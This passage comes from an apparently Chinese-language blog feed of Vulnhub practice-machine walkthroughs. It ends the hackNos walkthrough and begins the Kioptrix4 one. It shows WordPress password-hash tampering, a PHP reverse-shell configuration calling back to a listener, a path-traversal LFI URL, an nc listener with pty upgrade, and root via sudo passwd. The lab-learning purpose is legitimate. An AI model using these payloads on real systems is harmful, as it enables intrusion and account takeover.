5.7.27-0ubuntu0.18.04.1 (Ubuntu)                                                                                                                                                                                           </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.                                                                                                                                                               </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its                                                                                                                                                                          </span><br><span class="line">affiliates. Other names may be trademarks of their respective                                                                                                                                                                              </span><br><span class="line">owners.                                                                                                                                                                                                                                    </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.                                                                                                                                                             </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| wordpress          |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>

<p>成功连接数据库，接下来查看wordpress数据库中的数据表并且查看后台user用户的密码的hash值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; use wordpress;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+-----------------------+</span><br><span class="line">| Tables_in_wordpress   |</span><br><span class="line">+-----------------------+</span><br><span class="line">| wp_commentmeta        |</span><br><span class="line">| wp_comments           |</span><br><span class="line">| wp_links              |</span><br><span class="line">| wp_options            |</span><br><span class="line">| wp_postmeta           |</span><br><span class="line">| wp_posts              |</span><br><span class="line">| wp_term_relationships |</span><br><span class="line">| wp_term_taxonomy      |</span><br><span class="line">| wp_termmeta           |</span><br><span class="line">| wp_terms              |</span><br><span class="line">| wp_usermeta           |</span><br><span class="line">| wp_users              |</span><br><span class="line">+-----------------------+</span><br><span class="line">12 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line">mysql&gt; select * from wp_users;</span><br><span class="line">+----+------------+------------------------------------+---------------+-----------------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">| ID | user_login | user_pass                          | user_nicename | user_email            | user_url | user_registered     | user_activation_key | user_status | display_name |</span><br><span class="line">+----+------------+------------------------------------+---------------+-----------------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">|  1 | user       | <span class="variable">$P</span><span class="variable">$B</span>.O0cLMNmn7EoX.JMHPnNIPuBYw6S2/ | user          | rahulgehlaut@mail.com |          | 2019-11-17 17:56:53 |                     |           0 | user         |</span><br><span class="line">+----+------------+------------------------------------+---------------+-----------------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>我试了一下将$P$B.O0cLMNmn7EoX.JMHPnNIPuBYw6S2/解密，发现无法解密，使用下面的命令修改user的密码成为user。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; update wp_users <span class="built_in">set</span> user_pass=md5(<span class="string">&quot;user&quot;</span>) <span class="built_in">where</span> user_login=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">Query OK, 1 row affected (0.05 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from wp_users;</span><br><span class="line">+----+------------+----------------------------------+---------------+-----------------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">| ID | user_login | user_pass                        | user_nicename | user_email            | user_url | user_registered     | user_activation_key | user_status | display_name |</span><br><span class="line">+----+------------+----------------------------------+---------------+-----------------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">|  1 | user       | ee11cbb19052e40b07aac0ca060c23ee | user          | rahulgehlaut@mail.com |          | 2019-11-17 17:56:53 |                     |           0 | user         |</span><br><span class="line">+----+------------+----------------------------------+---------------+-----------------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line">mysql&gt; select * from wp_users;</span><br><span class="line">+----+------------+------------------------------------+---------------+-----------------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">| ID | user_login | user_pass                          | user_nicename | user_email            | user_url | user_registered     | user_activation_key | user_status | display_name |</span><br><span class="line">+----+------------+------------------------------------+---------------+-----------------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">|  1 | user       | <span class="variable">$P</span><span class="variable">$BRis7BEtqoG2Rvm0bIbgz</span>.c1fl79YI. | user          | rahulgehlaut@mail.com |          | 2019-11-17 17:56:53 |                     |           0 | user         |</span><br><span class="line">+----+------------+------------------------------------+---------------+-----------------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>$P$BRis7BEtqoG2Rvm0bIbgz.c1fl79YI.解密出来结果就是user,修改成功,登录后台.</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub76.jpg"></p>
<p>将php reverse shell中的ip修改成kali端监听的ip，然后进入wordpress后台的模板修改界面，将<br>readme.txt文件内的内容改为php reverse shell木马中的内容,然后访问readme.txt文件发现成功修改。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">set_time_limit (0);</span><br><span class="line"><span class="variable">$VERSION</span> = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;192.168.56.102&#x27;</span>;  // CHANGE THIS</span><br><span class="line"><span class="variable">$port</span> = 5566;       // CHANGE THIS</span><br><span class="line"><span class="variable">$chunk_size</span> = 1400;</span><br><span class="line"><span class="variable">$write_a</span> = null;</span><br><span class="line"><span class="variable">$error_a</span> = null;</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&#x27;uname -a; w; id; /bin/sh -i&#x27;</span>;</span><br><span class="line"><span class="variable">$daemon</span> = 0;</span><br><span class="line"><span class="variable">$debug</span> = 0;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub77.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub78.jpg"></p>
<p>然后利用之前的LFI漏洞包含该txt文件，然后kali端监听</p>
<p>浏览器执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">192.168.56.101/tsweb/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&amp;cfg=../../../../../../../../../../var/www/html/tsweb/wp-content/themes/twentytwenty/readme.txt</span><br></pre></td></tr></table></figure>

<p>kali端成功返回shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">192.168.56.101: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.101] 49214</span><br><span class="line">Linux hacknos 4.15.0-70-generic <span class="comment">#79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"> 03:45:19 up  1:45,  2 users,  load average: 0.06, 0.02, 0.00</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">flag     pts/0    192.168.56.102   02:04   13:38   0.03s  0.03s -rbash</span><br><span class="line">flag     pts/1    192.168.56.102   02:11   43:03   0.02s  0.01s mysql -h localhost -uwpuser -px xxxxxxxxxxx</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ pwd</span></span><br><span class="line"><span class="string">/</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br><span class="line"><span class="string">$ python -c &#x27;</span>import pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">www-data@hacknos:/var/www/html/tsweb$ ls</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">index.php        wp-blog-header.php    wp-cron.php        wp-mail.php</span></span><br><span class="line"><span class="string">license.txt      wp-comments-post.php  wp-includes        wp-settings.php</span></span><br><span class="line"><span class="string">readme.html      wp-config-sample.php  wp-links-opml.php  wp-signup.php</span></span><br><span class="line"><span class="string">wp-activate.php  wp-config.php         wp-load.php        wp-trackback.php</span></span><br><span class="line"><span class="string">wp-admin         wp-content            wp-login.php       xmlrpc.php</span></span><br></pre></td></tr></table></figure>

<ul>
<li>注意：</li>
</ul>
<p>运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
<p>这条命令很重要，运行后将能获得一个可交互的pty的shell,不运行的话很多命令无法执行。</p>
<p>进入到/var/backups/passbkp目录下查看md5-hash的值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@hacknos:/var/backups/passbkp$ cat md5-hash</span><br><span class="line">cat md5-hash</span><br><span class="line"><span class="variable">$1</span><span class="variable">$rohit</span><span class="variable">$01Dl0NQKtgfeL08fGrggi0</span></span><br></pre></td></tr></table></figure>

<p>解密hash值得到!%hack41</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub79.jpg"></p>
<p>ssh登录rohit用户，找到第一个flag,user.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rohit@hacknos:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">rohit@hacknos:~$ cat user.txt</span><br><span class="line"><span class="comment">############################################ </span></span><br><span class="line"> __    __   _______   ______    ______             </span><br><span class="line">/  |  /  | /       | /      \  /      \   </span><br><span class="line">$$ |  $$ |/$$$$$$$/ /$$$$$$  |/$$$$$$  |</span><br><span class="line">$$ |  $$ |$$      \ $$    $$ |$$ |  </span><br><span class="line">$$ \__$$ | $$$$$$  |$$$$$$$$/ $$ |       </span><br><span class="line">$$    $$/ /     $$/ $$       |$$ |           </span><br><span class="line"> $$$$$$/  $$$$$$$/   $$$$$$$/ $$/       </span><br><span class="line">                                                                                       </span><br><span class="line">                                                                                       </span><br><span class="line">                                                                                       </span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"></span><br><span class="line">MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>帅呆了，下面提权，找到第二个flag</p>
<p>运行下面命令寻找SUID提权可执行文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rohit@hacknos:~$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/bin/su</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/umount</span><br><span class="line">/usr/bin/traceroute6.iputils</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newuidmap</span><br><span class="line">/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br></pre></td></tr></table></figure>

<p>发现/usr/bin/passwd和/usr/bin/sudo都具有SUID权限，就可以使用sudo passwd修改root账户的密码，从而实现root用户登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rohit@hacknos:~$ sudo passwd</span><br><span class="line">[sudo] password <span class="keyword">for</span> rohit: (输入rohit用户的密码)</span><br><span class="line">Enter new UNIX password: </span><br><span class="line">Retype new UNIX password: </span><br><span class="line">passwd: password updated successfully</span><br></pre></td></tr></table></figure>

<p>root登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rohit@hacknos:~$ su</span><br><span class="line">Password: </span><br><span class="line">root@hacknos:/home/rohit<span class="comment">#cd /root</span></span><br><span class="line">root@hacknos:~<span class="comment"># ls</span></span><br><span class="line">root.txt</span><br><span class="line">root@hacknos:~<span class="comment"># cat root.txt </span></span><br><span class="line"> _______                         __              __  __     <span class="comment">#</span></span><br><span class="line">/       \                       /  |            /  |/  |    <span class="comment">#</span></span><br><span class="line">$$$$$$$  |  ______    ______   _$$ |_          _$$ |$$ |_   <span class="comment">#</span></span><br><span class="line">$$ |__$$ | /      \  /      \ / $$   |        / $$  $$   |  <span class="comment">#</span></span><br><span class="line">$$    $$&lt; /$$$$$$  |/$$$$$$  |$$$$$$/         $$$$$$$$$$/   <span class="comment">#</span></span><br><span class="line">$$$$$$$  |$$ |  $$ |$$ |  $$ |  $$ | __       / $$  $$   |  <span class="comment"># </span></span><br><span class="line">$$ |  $$ |$$ \__$$ |$$ \__$$ |  $$ |/  |      $$$$$$$$$$/   <span class="comment">#</span></span><br><span class="line">$$ |  $$ |$$    $$/ $$    $$/   $$  $$/         $$ |$$ |    <span class="comment">#</span></span><br><span class="line">$$/   $$/  $$$$$$/   $$$$$$/     $$$$/          $$/ $$/     <span class="comment">#</span></span><br><span class="line"><span class="comment">#############################################################                                                          </span></span><br><span class="line">                                                          </span><br><span class="line"><span class="comment">#############################################################                                                          </span></span><br><span class="line">MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b</span><br><span class="line"></span><br><span class="line">Blog : www.hackNos.com</span><br><span class="line"></span><br><span class="line">Author : Rahul Gehlaut</span><br><span class="line"></span><br><span class="line">linkedin : https://www.linkedin.com/<span class="keyword">in</span>/rahulgehlaut/</span><br><span class="line"><span class="comment">#############################################################</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub80.jpg"></p>
<p>至此第二个flag已经找到，挑战结束，帅掉渣。</p>
<p>各位大虾看了觉得不错的话。请捐助我一点，不要白嫖，thanks very much.</p>
<p>(本文全网首发，google都搜不到，发布日期：2019/12/20)</p>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[Kioptrix4]</title>
    <url>/2019/12/10/Kioptrix4/</url>
    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>名称：Kioptrix: Level 1.3 (#4)<br>发布日期：2012年2月8日</p>
<p>下载链接:<br>Kioptrix4_vmware.rar (Size: 208 MB)<br>Download: <span class="exturl" data-url="aHR0cDovL3d3dy5raW9wdHJpeC5jb20vZGx2bS9LaW9wdHJpeDRfdm13YXJlLnJhcg==">http://www.kioptrix.com/dlvm/Kioptrix4_vmware.rar<i class="fa fa-external-link-alt"></i></span><br>Download(Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9raW9wdHJpeC9LaW9wdHJpeDRfdm13YXJlLnJhcg==">https://download.vulnhub.com/kioptrix/Kioptrix4_vmware.rar<i class="fa fa-external-link-alt"></i></span><br>Download(Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9raW9wdHJpeC9LaW9wdHJpeDRfdm13YXJlLnJhci50b3JyZW50">https://download.vulnhub.com/kioptrix/Kioptrix4_vmware.rar.torrent<i class="fa fa-external-link-alt"></i></span></p>
<p>虚拟机之间再次存在很长的延迟，但这无济于事。 工作，家庭必须是第一位的。 博客和兴趣爱好排在列表的下方。 这些事情并不像人们想象的那么容易。 必须为这些挑战投入时间和一些计划，以确保：</p>
<a id="more"></a>

<p>1.可以远程获得root权限[编辑：对不起，我的意思不是]</p>
<p>1a. 可以远程破坏机器</p>
<ul>
<li>1.停留在此网站的目标受众范围内</li>
<li>2.必须是“现实的”（好吧……）</li>
<li>3.应该为我复习。 无论是PHP还是MySQL用法等等。我已经有一段时间没做过了。</li>
</ul>
<p>我也很难导出这个。 因此，请花时间阅读本文结尾处的评论。</p>
<p>秉承事物的精神，这一挑战与其他挑战有所不同，但仍处于轻松的境界。 我知道自己重复一遍，但必须始终清楚：这些VM是针对初学者的。 这是一个起点。</p>
<p>我很想编写一些小型的自定义应用程序，以供人们使用。 但我是管理员，不是编码员。 学习/编码这样的应用程序将花费太多时间。 并不是说我永远不会尝试做一个，但我不会屏住呼吸。 如果有人想要更艰巨的挑战，我敢肯定，Inter-tube会将他们抱在某个地方。 或者，您也可以随时注册Offsec的PWB课程。无耻的插头</p>
<p>– 我必须说几件事。 我使用新平台制作了这张图片。 希望一切正常，但我无法测试所有内容。 最初，VM在启动时很难获得IP。 由于某种原因，NIC无法启动，并且机器留有环回接口。 我希望我解决了这个问题。 如果这个启动需要一点时间，请不要感到惊讶。 它正在尝试获取IP。 有点耐心。 有人为我测试了映像，还报告说VM开机后就挂了。 重新启动后一切都很好。 只有一个人报告了此消息，因此希望这不是主要问题。 如果计划在vmFusion上运行它，则可能需要转换想象以适合您的融合版本。<br>– 还为使用Hyper-V的用户添加了VHD文件以供下载。 你们可能需要将网络适配器更改为“旧版网络适配器”。 我已经对该文件进行了测试，这个文件似乎对我来说还算不错…如果您遇到问题，或者由于某种原因它无法正常工作，请发送电子邮件comms [=]kioptrix.com</p>
<p>感谢<span class="exturl" data-url="aHR0cDovL3d3dy5uMDBicGVudGVzdGluZy5jb20lRTQlQjglOEElRTclOUElODRAc2hhaV9zYWludOS9v+eUqOWQhOenjXZt6Kej5Yaz5pa55qGI6L+b6KGM5oCl6ZyA55qE5rWL6K+VLi8=">www.n00bpentesting.com上的@shai_saint使用各种VM解决方案进行急需的测试。<i class="fa fa-external-link-alt"></i></span></p>
<p>感谢Hackfest.ca的Patrick也运行了VM并报告了一些问题。 Swappage和@Tallenz也这样做。 所有的帮助都是感激的家伙</p>
<p>所以我希望你喜欢这个。</p>
<p>Kioptrix团队</p>
<p>Note:只是一个虚拟硬盘。 您需要创建一个新的虚拟机并附加现有的硬盘驱动器.</p>
<p>运行服务:</p>
<ul>
<li>Apache</li>
<li>MySQL</li>
<li>OpenSSH</li>
<li>PHP</li>
<li>Samba</li>
</ul>
<p>漏洞知识点:</p>
<ul>
<li>文件包含</li>
<li>操作系统命令注入</li>
<li>权限提升</li>
<li>特权不正确的服务</li>
<li>SQL注入</li>
</ul>
<h3 id="虚拟机与网络配置"><a href="#虚拟机与网络配置" class="headerlink" title="虚拟机与网络配置"></a>虚拟机与网络配置</h3><p>点击vmware新建虚拟机，选择ubuntu,接下来的配置，除了下图配置与平常不同，其他步骤均与平常相同</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub32.jpg"></p>
<p>.vmdk文件为压缩包中解压出的文件</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub33.jpg"></p>
<p>将虚拟靶机和kali攻击机的vmware网络都配置成[自定义：特定虚拟网络的&lt;VMnet8(NAT模式)&gt;]即可。</p>
<h4 id="信息收集-仅截取关键部分"><a href="#信息收集-仅截取关键部分" class="headerlink" title="信息收集(仅截取关键部分)"></a>信息收集(仅截取关键部分)</h4><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn -v 192.168.84.0/24</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.136 [host down]</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.137 [host down]</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.138 [host down]</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.139</span><br><span class="line">Host is up (0.0010s latency).</span><br><span class="line">MAC Address: 00:0C:29:F3:0E:E9 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.140 [host down]</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.141 [host down]</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.142 [host down]</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.143 [host down]</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A -v -sS -Pn -T4 --script=vuln 192.168.84.139</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Scanning 192.168.84.139 [1000 ports]</span><br><span class="line">Discovered open port 139/tcp on 192.168.84.139</span><br><span class="line">Discovered open port 80/tcp on 192.168.84.139</span><br><span class="line">Discovered open port 22/tcp on 192.168.84.139</span><br><span class="line">Discovered open port 445/tcp on 192.168.84.139</span><br><span class="line">Completed SYN Stealth Scan at 20:57, 2.09s elapsed (1000 total ports)</span><br><span class="line">Initiating Service scan at 20:57</span><br><span class="line">Scanning 4 services on 192.168.84.139</span><br><span class="line">Completed Service scan at 20:57, 11.02s elapsed (4 services on 1 host)</span><br><span class="line">Initiating OS detection (try <span class="comment">#1) against 192.168.84.139</span></span><br><span class="line">NSE: Script scanning 192.168.84.139.</span><br><span class="line">Initiating NSE at 20:57</span><br><span class="line">Stats: 0:02:49 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan</span><br><span class="line">NSE: Active NSE Script Threads: 3 (3 waiting)</span><br><span class="line">NSE Timing: About 99.42% <span class="keyword">done</span>; ETC: 20:59 (0:00:01 remaining)</span><br><span class="line">Completed NSE at 21:02, 311.88s elapsed</span><br><span class="line">Initiating NSE at 21:02</span><br><span class="line">Completed NSE at 21:02, 0.12s elapsed</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.139</span><br><span class="line">Host is up (0.00036s latency).</span><br><span class="line">Not shown: 566 closed ports, 430 filtered ports</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| vulners: </span><br><span class="line">|   cpe:/a:openbsd:openssh:4.7p1: </span><br><span class="line">|       CVE-2010-4478   7.5     https://vulners.com/cve/CVE-2010-4478</span><br><span class="line">|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906</span><br><span class="line">|       CVE-2016-10708  5.0     https://vulners.com/cve/CVE-2016-10708</span><br><span class="line">|       CVE-2010-4755   4.0     https://vulners.com/cve/CVE-2010-4755</span><br><span class="line">|_      CVE-2008-5161   2.6     https://vulners.com/cve/CVE-2008-5161</span><br><span class="line">80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.84.139</span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.84.139:80/</span><br><span class="line">|     Form id: myusername</span><br><span class="line">|     Form action: checklogin.php</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.84.139:80/checklogin.php</span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: index.php</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.84.139:80/index.php</span><br><span class="line">|     Form id: myusername</span><br><span class="line">|_    Form action: checklogin.php</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">| http-enum: </span></span><br><span class="line"><span class="string">|   /database.sql: Possible database backup</span></span><br><span class="line"><span class="string">|   /icons/: Potentially interesting folder w/ directory listing</span></span><br><span class="line"><span class="string">|   /images/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.2.8 (ubuntu) php/5.2.4-2ubuntu5.6 with suhosin-patch<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|_  /index/: Potentially interesting folder</span></span><br><span class="line"><span class="string">|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch</span></span><br><span class="line"><span class="string">| http-slowloris-check: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   Slowloris DOS attack</span></span><br><span class="line"><span class="string">|     State: LIKELY VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  CVE:CVE-2007-6750</span></span><br><span class="line"><span class="string">|       Slowloris tries to keep many connections to the target web server open and hold</span></span><br><span class="line"><span class="string">|       them open as long as possible.  It accomplishes this by opening connections to</span></span><br><span class="line"><span class="string">|       the target web server and sending a partial request. By doing so, it starves</span></span><br><span class="line"><span class="string">|       the http server&#x27;</span>s resources causing Denial Of Service.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure date: 2009-09-17</span><br><span class="line">|     References:</span><br><span class="line">|       http://ha.ckers.org/slowloris/</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-trace: TRACE is enabled</span></span><br><span class="line"><span class="string">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">| vulners: </span></span><br><span class="line"><span class="string">|   cpe:/a:apache:http_server:2.2.8: </span></span><br><span class="line"><span class="string">|       CVE-2010-0425   10.0    https://vulners.com/cve/CVE-2010-0425</span></span><br><span class="line"><span class="string">|       CVE-2011-3192   7.8     https://vulners.com/cve/CVE-2011-3192</span></span><br><span class="line"><span class="string">|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679</span></span><br><span class="line"><span class="string">|       CVE-2013-2249   7.5     https://vulners.com/cve/CVE-2013-2249</span></span><br><span class="line"><span class="string">|       CVE-2009-1891   7.1     https://vulners.com/cve/CVE-2009-1891</span></span><br><span class="line"><span class="string">|       CVE-2009-1890   7.1     https://vulners.com/cve/CVE-2009-1890</span></span><br><span class="line"><span class="string">|       CVE-2012-0883   6.9     https://vulners.com/cve/CVE-2012-0883</span></span><br><span class="line"><span class="string">|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312</span></span><br><span class="line"><span class="string">|       CVE-2013-1862   5.1     https://vulners.com/cve/CVE-2013-1862</span></span><br><span class="line"><span class="string">|       CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231</span></span><br><span class="line"><span class="string">|       CVE-2014-0098   5.0     https://vulners.com/cve/CVE-2014-0098</span></span><br><span class="line"><span class="string">|       CVE-2013-6438   5.0     https://vulners.com/cve/CVE-2013-6438</span></span><br><span class="line"><span class="string">|       CVE-2011-3368   5.0     https://vulners.com/cve/CVE-2011-3368</span></span><br><span class="line"><span class="string">|       CVE-2010-1452   5.0     https://vulners.com/cve/CVE-2010-1452</span></span><br><span class="line"><span class="string">|       CVE-2010-0408   5.0     https://vulners.com/cve/CVE-2010-0408</span></span><br><span class="line"><span class="string">|       CVE-2009-2699   5.0     https://vulners.com/cve/CVE-2009-2699</span></span><br><span class="line"><span class="string">|       CVE-2008-2364   5.0     https://vulners.com/cve/CVE-2008-2364</span></span><br><span class="line"><span class="string">|       CVE-2007-6750   5.0     https://vulners.com/cve/CVE-2007-6750</span></span><br><span class="line"><span class="string">|       CVE-2009-1195   4.9     https://vulners.com/cve/CVE-2009-1195</span></span><br><span class="line"><span class="string">|       CVE-2012-0031   4.6     https://vulners.com/cve/CVE-2012-0031</span></span><br><span class="line"><span class="string">|       CVE-2011-3607   4.4     https://vulners.com/cve/CVE-2011-3607</span></span><br><span class="line"><span class="string">|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975</span></span><br><span class="line"><span class="string">|       CVE-2013-1896   4.3     https://vulners.com/cve/CVE-2013-1896</span></span><br><span class="line"><span class="string">|       CVE-2012-4558   4.3     https://vulners.com/cve/CVE-2012-4558</span></span><br><span class="line"><span 